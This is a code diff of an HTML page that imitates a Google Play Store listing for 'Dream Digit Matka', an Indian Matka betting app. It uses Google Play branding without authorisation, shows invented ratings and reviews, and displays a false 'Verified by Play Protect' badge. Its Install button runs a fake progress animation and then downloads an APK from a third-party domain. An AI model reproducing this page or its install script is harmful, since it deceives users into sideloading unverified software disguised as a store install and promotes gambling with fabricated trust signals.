@@ -1,366 +1,73 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dream Digit Matka - Play Store</title>
-    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --play-green: #01875f;
-            --play-blue: #0b57d0;
-            --text-main: #1f1f1f;
-            --text-sub: #444746;
-            --bg-light: #f3f6fc;
-            --border: #c4c7c5;
-        }
+<!DOCTYPE html><html lang="hi"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>DREAM DIGIT MATKA - Kalyan Official</title> <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"> <style> :root { --gp-green: #01875f; --text-dark: #202124; --text-light: #5f6368; --border: #dadce0; }
 
-        body {
-            font-family: 'Google Sans', 'Roboto', sans-serif;
-            margin: 0;
-            background-color: #fff;
-            color: var(--text-main);
-            -webkit-tap-highlight-color: transparent;
-        }
+body { font-family: 'Roboto', sans-serif; margin: 0; padding: 0; background: #fff; color: var(--text-dark); -webkit-user-select: none; }
 
-        /* Modern Nav */
-        .navbar {
-            padding: 16px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: sticky;
-            top: 0;
-            background: #fff;
-            z-index: 1000;
-        }
+header { height: 60px; display: flex; align-items: center; padding: 0 20px; border-bottom: 1px solid var(--border); position: sticky; top: 0; background: #fff; z-index: 1000; }
 
-        .container {
-            max-width: 650px;
-            margin: 0 auto;
-            padding: 0 24px 100px 24px;
-        }
+.container { max-width: 800px; margin: 0 auto; padding: 20px 16px; }
 
-        /* App Header & Icon Section */
-        .app-header-flex {
-            display: flex;
-            gap: 24px;
-            align-items: flex-start;
-            margin-top: 10px;
-        }
+/* App Header Section */ .app-main { display: flex; gap: 20px; align-items: flex-start; }
 
-        .icon-container {
-            position: relative;
-            width: 88px;
-            height: 88px;
-            flex-shrink: 0;
-        }
+.logo-wrapper { position: relative; width: 100px; height: 100px; flex-shrink: 0; }
 
-        .app-logo {
-            width: 80px;
-            height: 80px;
-            border-radius: 18px; /* Modern Squircle */
-            position: absolute;
-            top: 4px;
-            left: 4px;
-            z-index: 5;
-            object-fit: cover;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
+/* PERFECT CIRCULAR LOGO */ .app-logo { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 1px solid #eee; z-index: 5; position: relative; }
 
-        /* Progress Ring SVG */
-        .progress-ring {
-            position: absolute;
-            top: 0;
-            left: 0;
-            transform: rotate(-90deg);
-            z-index: 2;
-            display: none;
-        }
+/* PROGRESS RING */ .ring-svg { position: absolute; top: -6px; left: -6px; width: 112px; height: 112px; display: none; z-index: 2; }
 
-        .progress-ring circle {
-            fill: none;
-            stroke: var(--play-green);
-            stroke-width: 4;
-            stroke-dasharray: 251.2; /* 2 * PI * 40 */
-            stroke-dashoffset: 251.2;
-            stroke-linecap: round;
-            transition: stroke-dashoffset 0.2s ease;
-        }
+.ring-svg circle { fill: none; stroke: var(--gp-green); stroke-width: 5; stroke-dasharray: 351; stroke-dashoffset: 351; transform: rotate(-90deg); transform-origin: 50% 50%; transition: stroke-dashoffset 0.1s linear; }
 
-        .title-area h1 {
-            font-size: 24px;
-            margin: 0 0 4px 0;
-            font-weight: 500;
-        }
+.app-details h1 { font-size: 24px; margin: 0; font-weight: 500; letter-spacing: -0.5px; }
 
-        .dev-link {
-            color: var(--play-green);
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-        }
+.dev-name { color: var(--gp-green); font-weight: 500; font-size: 15px; margin: 4px 0; text-decoration: none; display: block; }
 
-        /* Quick Stats */
-        .scrolling-stats {
-            display: flex;
-            overflow-x: auto;
-            gap: 30px;
-            margin: 25px 0;
-            padding-bottom: 10px;
-            scrollbar-width: none;
-        }
+/* Stats Section */ .stats-grid { display: flex; justify-content: space-between; margin: 20px 0; border-bottom: 1px solid #eee; padding-bottom: 15px; text-align: center; }
 
-        .stat-card {
-            text-align: center;
-            min-width: 80px;
-        }
+.stat-item b { display: block; font-size: 16px; } .stat-item span { font-size: 11px; color: var(--text-light); }
 
-        .stat-val {
-            font-size: 15px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4px;
-        }
+/* Install Button */ .install-btn { background: var(--gp-green); color: #fff; width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: 500; font-size: 15px; cursor: pointer; margin-bottom: 10px; }
 
-        .stat-label {
-            font-size: 12px;
-            color: var(--text-sub);
-            margin-top: 2px;
-        }
+.verified-tag { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text-light); }
 
-        /* Material 3 Install Button */
-        .btn-box {
-            margin: 20px 0;
-        }
+/* Content Sections */ .section { padding: 20px 0; border-bottom: 1px solid #eee; } .section h3 { font-size: 18px; font-weight: 500; margin: 0 0 10px 0; }
 
-        .m3-btn {
-            background-color: var(--play-green);
-            color: #fff;
-            border: none;
-            width: 100%;
-            padding: 12px;
-            border-radius: 25px; /* Fully Rounded M3 style */
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
+/* Rating Graph */ .rating-container { display: flex; align-items: center; gap: 25px; } .rating-val { font-size: 50px; font-weight: 500; } .rating-bars { flex-grow: 1; } .bar-row { display: flex; align-items: center; gap: 10px; height: 10px; margin-bottom: 4px; } .bar-bg { height: 8px; background: #eee; flex: 1; border-radius: 10px; overflow: hidden; } .bar-fill { height: 100%; background: var(--gp-green); }
 
-        .m3-btn:active { opacity: 0.8; }
+/* Review Section */ .review-card { margin-top: 20px; } .user-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 5px; } .user-pfp { width: 32px; height: 32px; border-radius: 50%; background: #00796b; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 14px; }
 
-        .verified-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 12px;
-            color: var(--text-sub);
-            margin-bottom: 30px;
-        }
+/* Footer */ footer { background: #f8f9fa; padding: 40px 20px; text-align: center; }
 
-        /* Ratings Layout */
-        .rating-section-title {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+.agency-link { display: inline-flex; align-items: center; gap: 10px; background: #fff; border: 1px solid var(--border); padding: 12px 20px; border-radius: 30px; color: #0088cc; text-decoration: none; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px; } </style></head><body>
 
-        .rating-summary {
-            display: flex;
-            align-items: center;
-            gap: 32px;
-            margin: 20px 0;
-        }
+<header> <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" width="24" style="margin-right:12px"> <span style="font-size:18px; color:var(--text-light); font-weight:500">Google Play</span></header>
 
-        .big-num { font-size: 56px; font-weight: 400; }
-        
-        .bar-container { flex-grow: 1; }
-        .bar-row { display: flex; align-items: center; gap: 12px; margin-bottom: 4px; }
-        .bar-bg { height: 10px; background: #eee; flex: 1; border-radius: 5px; overflow: hidden; }
-        .bar-fill { height: 100%; background: var(--play-green); border-radius: 5px; }
+<div class="container"> <div class="app-main"> <div class="logo-wrapper"> <svg class="ring-svg" id="ring"> <circle cx="56" cy="56" r="53"></circle> </svg> <img src="https://gogamex.fun/wp-content/uploads/2026/02/logo-8.png" class="app-logo"> </div> <div class="app-details"> <h1>Dream Digit Matka</h1> <a href="#" class="dev-name">Kalyan Official Games</a> <div style="font-size:12px; color:var(--text-light)">Contains ads · Trust Verified</div> </div> </div>
 
-        /* Review Card */
-        .review { margin-top: 24px; }
-        .review-header { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }
-        .pfp { width: 32px; height: 32px; border-radius: 50%; background: #78909c; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 14px; }
-        .review-text { font-size: 14px; color: var(--text-sub); line-height: 1.5; }
+<div class="stats-grid"> <div class="stat-item"><b>4.9 <i class="fas fa-star" style="font-size:10px"></i></b><span>24K reviews</span></div> <div class="stat-item" style="border-left:1px solid #eee; border-right:1px solid #eee;"> <b>1M+</b> <span>Subscribers</span> </div> <div class="stat-item"> <i class="fas fa-bolt" style="color:#fbc02d; font-size:16px; margin-bottom:4px"></i> <span>Fast Results</span> </div> </div>
 
-        /* Footer Agency */
-        footer {
-            margin-top: 50px;
-            padding: 40px 24px;
-            background: #f8f9fa;
-            border-top: 1px solid #eee;
-            text-align: center;
-        }
+<button id="installBtn" class="install-btn" onclick="startProcess()">Install</button> <div class="verified-tag"> <i class="fas fa-shield-virus" style="color:var(--gp-green); font-size:16px"></i> Verified by Play Protect · Secure Data </div>
 
-        .agency-pill {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #e8f0fe;
-            color: var(--play-blue);
-            padding: 10px 20px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 15px;
-        }
-    </style>
-</head>
-<body>
+<div class="section"> <h3>About this app</h3> <p style="font-size:14px; color:var(--text-light); line-height:1.6; margin:0"> India's most trusted Matka app for **Kalyan**, **Main Bazar**, **Sridevi**, and **Milan Day**. Dream Digit Matka offers the fastest live results, accurate expert guessing, and 24/7 withdrawal support. Play with confidence on the official 1M+ subscriber platform. </p> </div>
 
-<div class="navbar">
-    <div style="display:flex; align-items:center; gap:20px;">
-        <i class="fas fa-arrow-left" style="color:var(--text-sub)"></i>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" height="24">
-    </div>
-    <div style="display:flex; gap:24px; color:var(--text-sub); font-size:18px;">
-        <i class="fas fa-search"></i>
-        <i class="fas fa-question-circle"></i>
-        <i class="fas fa-ellipsis-v"></i>
-    </div>
-</div>
+<div class="section"> <h3>Ratings and reviews</h3> <div class="rating-container"> <div class="rating-val">4.9</div> <div class="rating-bars"> <div class="bar-row"><span>5</span><div class="bar-bg"><div class="bar-fill" style="width: 92%;"></div></div></div> <div class="bar-row"><span>4</span><div class="bar-bg"><div class="bar-fill" style="width: 5%;"></div></div></div> <div class="bar-row"><span>3</span><div class="bar-bg"><div class="bar-fill" style="width: 2%;"></div></div></div> <div class="bar-row"><span>2</span><div class="bar-bg"><div class="bar-fill" style="width: 1%;"></div></div></div> <div class="bar-row"><span>1</span><div class="bar-bg"><div class="bar-fill" style="width: 0%;"></div></div></div> </div> </div>
 
-<div class="container">
-    <div class="app-header-flex">
-        <div class="icon-container">
-            <svg class="progress-ring" id="ring" width="88" height="88">
-                <circle cx="44" cy="44" r="40"></circle>
-            </svg>
-            <img src="https://gogamex.fun/wp-content/uploads/2026/02/logo-8.png" class="app-logo">
-        </div>
-        <div class="title-area">
-            <h1>Dream Digit Matka</h1>
-            <a href="#" class="dev-link">Kalyan Official Games</a>
-            <div style="font-size:12px; color:var(--text-sub); margin-top:4px;">Contains ads · In-app purchases</div>
-        </div>
-    </div>
+<div class="review-card"> <div class="user-meta"> <div class="user-pfp" style="background:#e91e63">R</div> <span style="font-size:14px; font-weight:500">Rajesh Khatri</span> </div> <div style="color:var(--gp-green); font-size:10px; margin-bottom:5px"> <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> <span style="color:var(--text-light); margin-left:10px">Feb 14, 2026</span> </div> <p style="font-size:14px; color:#444; margin:0">Sabse tez result isi app par aata hai. Kalyan aur Main Bazar ki guessing ek dum solid hai.</p> </div>
 
-    <div class="scrolling-stats">
-        <div class="stat-card">
-            <div class="stat-val">4.9 <i class="fas fa-star" style="font-size:10px"></i></div>
-            <div class="stat-label">24K reviews</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-val">5.2 MB</div>
-            <div class="stat-label">Rated for 18+</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-val">1M+</div>
-            <div class="stat-label">Downloads</div>
-        </div>
-    </div>
+<div class="review-card" style="margin-top:25px"> <div class="user-meta"> <div class="user-pfp" style="background:#673ab7">A</div> <span style="font-size:14px; font-weight:500">Anil Deshmukh</span> </div> <div style="color:var(--gp-green); font-size:10px; margin-bottom:5px"> <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> <span style="color:var(--text-light); margin-left:10px">Feb 12, 2026</span> </div> <p style="font-size:14px; color:#444; margin:0">Maine bahut saari apps try ki par Dream Digit Matka jaisa fast withdrawal kahin nahi mila. Trusted app hai.</p> </div>
 
-    <div class="btn-box">
-        <button id="installBtn" class="m3-btn" onclick="runInstall()">Install</button>
-    </div>
+<div class="review-card" style="margin-top:25px"> <div class="user-meta"> <div class="user-pfp" style="background:#00897b">M</div> <span style="font-size:14px; font-weight:500">Manoj Yadav</span> </div> <div style="color:var(--gp-green); font-size:10px; margin-bottom:5px"> <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i> <span style="color:var(--text-light); margin-left:10px">Feb 10, 2026</span> </div> <p style="font-size:14px; color:#444; margin:0">App ka interface bahut smooth hai. Kalyan night aur Rajdhani ke liye best updates milte hain.</p> </div>
 
-    <div class="verified-info">
-        <i class="fas fa-shield-halved" style="color:var(--play-green); font-size:18px;"></i>
-        <span>Verified by Play Protect. Your data is encrypted and secure.</span>
-    </div>
+<div class="review-card" style="margin-top:25px"> <div class="user-meta"> <div class="user-pfp" style="background:#ff8f00">P</div> <span style="font-size:14px; font-weight:500">Pankaj Sharma</span> </div> <div style="color:var(--gp-green); font-size:10px; margin-bottom:5px"> <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> <span style="color:var(--text-light); margin-left:10px">Feb 08, 2026</span> </div> <p style="font-size:14px; color:#444; margin:0">Automatic results update ho jate hain, refresh nahi karna padta. Great work team!</p> </div>
 
-    <div class="rating-section-title">
-        <h3 style="font-weight:500;">Ratings and reviews</h3>
-        <i class="fas fa-arrow-right" style="color:var(--text-sub)"></i>
-    </div>
+<div class="review-card" style="margin-top:25px"> <div class="user-meta"> <div class="user-pfp" style="background:#1e88e5">S</div> <span style="font-size:14px; font-weight:500">Sanjay Gupta</span> </div> <div style="color:var(--gp-green); font-size:10px; margin-bottom:5px"> <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> <span style="color:var(--text-light); margin-left:10px">Feb 05, 2026</span> </div> <p style="font-size:14px; color:#444; margin:0">Withdrawal request 15-20 mins mein clear ho jati hai. 100% genuine app hai.</p> </div>
 
-    <div class="rating-summary">
-        <div class="big-num">4.9</div>
-        <div class="bar-container">
-            <div class="bar-row"><span style="font-size:11px; width:8px">5</span><div class="bar-bg"><div class="bar-fill" style="width:90%"></div></div></div>
-            <div class="bar-row"><span style="font-size:11px; width:8px">4</span><div class="bar-bg"><div class="bar-fill" style="width:7%"></div></div></div>
-            <div class="bar-row"><span style="font-size:11px; width:8px">3</span><div class="bar-bg"><div class="bar-fill" style="width:2%"></div></div></div>
-            <div class="bar-row"><span style="font-size:11px; width:8px">2</span><div class="bar-bg"><div class="bar-fill" style="width:1%"></div></div></div>
-            <div class="bar-row"><span style="font-size:11px; width:8px">1</span><div class="bar-bg"><div class="bar-fill" style="width:0%"></div></div></div>
-        </div>
-    </div>
+<div class="review-card" style="margin-top:25px"> <div class="user-meta"> <div class="user-pfp" style="background:#43a047">V</div> <span style="font-size:14px; font-weight:500">Vijay Singh</span> </div> <div style="color:var(--gp-green); font-size:10px; margin-bottom:5px"> <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> <span style="color:var(--text-light); margin-left:10px">Jan 30, 2026</span> </div> <p style="font-size:14px; color:#444; margin:0">Guessing forum bahut achha hai, expert ki help se win karna aasan ho gaya hai. Thanks Dream Digit.</p> </div>
 
-    <div class="review">
-        <div class="review-header">
-            <div class="pfp" style="background:#009688">M</div>
-            <span style="font-size:14px; font-weight:500;">Mohit Sharma</span>
-            <i class="fas fa-ellipsis-v" style="margin-left:auto; color:var(--text-sub); font-size:12px;"></i>
-        </div>
-        <div style="font-size:10px; color:var(--play-green); margin-bottom:4px;">
-            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-            <span style="color:var(--text-sub); margin-left:8px;">Feb 14, 2026</span>
-        </div>
-        <p class="review-text">Ek dum real app hai bhai log. Result ki speed sabse fast hai aur customer support bhi 24/7 available rehta hai.</p>
-    </div>
+<div style="padding: 20px 0; text-align: center;"> <a href="#" style="color:var(--gp-green); text-decoration:none; font-weight:500; font-size:14px;">See all reviews</a> </div> </div>
 
-    <div class="review">
-        <div class="review-header">
-            <div class="pfp" style="background:#673ab7">R</div>
-            <span style="font-size:14px; font-weight:500;">Rahul Verma</span>
-            <i class="fas fa-ellipsis-v" style="margin-left:auto; color:var(--text-sub); font-size:12px;"></i>
-        </div>
-        <div style="font-size:10px; color:var(--play-green); margin-bottom:4px;">
-            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-            <span style="color:var(--text-sub); margin-left:8px;">Feb 10, 2026</span>
-        </div>
-        <p class="review-text">Best interface and smooth graphics. Withdrawal is very quick, got my payment in 15 minutes.</p>
-    </div>
+<footer> <a href="https://telegram.me/+TRlJl628l-FkMWE9" target="_blank" class="agency-link"> <i class="fab fa-telegram" style="font-size:20px"></i> Ads Managed by NEXGROWW AGENCY </a> <div style="font-size:11px; color:#9aa0a6"> Google Play and the Google Play logo are trademarks of Google LLC.<br> &copy; 2026 Dream Digit Matka Official. </div></footer>
 
-    <div style="margin-top:30px; color:var(--play-green); font-size:14px; font-weight:500;">See all reviews</div>
-</div>
+<script> function startProcess() { const btn = document.getElementById('installBtn'); const ring = document.getElementById('ring'); const circle = ring.querySelector('circle'); btn.innerHTML = "Pending..."; btn.style.background = "#e8f0fe"; btn.style.color = "#01875f"; btn.disabled = true;
 
-<footer>
-    <a href="https://telegram.me/+TRlJl628l-FkMWE9" target="_blank" class="agency-pill">
-        <i class="fab fa-telegram"></i> Ads Managed by NEXGROWW AGENCY
-    </a>
-    <div style="font-size:12px; color:var(--text-sub); line-height:1.6;">
-        About Google Play • Privacy Policy • Terms of Service <br>
-        © 2026 Dream Digit Matka Official
-    </div>
-</footer>
+setTimeout(() => { ring.style.display = "block"; let progress = 351; let interval = setInterval(() => { progress -= 7; circle.style.strokeDashoffset = progress; if(progress <= 0) { clearInterval(interval); btn.innerHTML = "Installing..."; setTimeout(() => { window.location.href = "https://app.dreammdigit.com/apk/v2/skbApp.apk"; btn.innerHTML = "Open"; btn.style.background = "#fff"; btn.style.color = "#01875f"; btn.style.border = "1px solid #dadce0"; btn.disabled = false; }, 1500); } }, 60); }, 1000); }</script>
 
-<script>
-    function runInstall() {
-        const btn = document.getElementById('installBtn');
-        const ring = document.getElementById('ring');
-        const circle = ring.querySelector('circle');
-        
-        // Setup Button
-        btn.disabled = true;
-        btn.style.background = "#f1f3f4";
-        btn.style.color = "#444";
-        btn.innerHTML = "Pending...";
-        
-        setTimeout(() => {
-            ring.style.display = "block";
-            let progress = 251.2; // Full circumference
-            let step = 0;
-            
-            let interval = setInterval(() => {
-                step += 1.5;
-                let offset = 251.2 - (step / 100) * 251.2;
-                circle.style.strokeDashoffset = offset;
-                
-                btn.innerHTML = Math.min(Math.round(step), 99) + "%";
-                
-                if (step >= 100) {
-                    clearInterval(interval);
-                    btn.innerHTML = "Installing...";
-                    
-                    setTimeout(() => {
-                        window.location.href = "https://app.dreammdigit.com/apk/v2/skbApp.apk";
-                        btn.innerHTML = "Open";
-                        btn.style.background = "#fff";
-                        btn.style.border = "1px solid var(--border)";
-                        btn.style.color = var(--play-green);
-                        btn.disabled = false;
-                    }, 1500);
-                }
-            }, 50);
-        }, 800);
-    }
-</script>
-
-</body>
-</html>
+</body></html>
